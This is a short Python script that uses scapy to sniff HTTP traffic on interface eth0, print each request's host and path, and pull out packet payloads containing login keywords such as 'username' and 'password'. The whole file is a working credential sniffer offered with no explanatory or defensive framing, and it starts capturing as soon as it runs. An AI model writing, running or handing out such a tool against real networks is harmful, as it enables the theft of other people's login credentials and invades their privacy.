#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)

def get_url(packet):
     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
def get_username_password_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keyword = ["username", "uname'", "pass", "password", "login", "password"]
        for key in keyword:
            if key in load:
                return load

def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
         print("[+] get http Request >>>>  "+ str(url))
         login_info = get_username_password_info(packet)
         if login_info:
             print("\n\n[+] get username/password >>>>  "+str(login_info)+"\n\n")

sniff("eth0")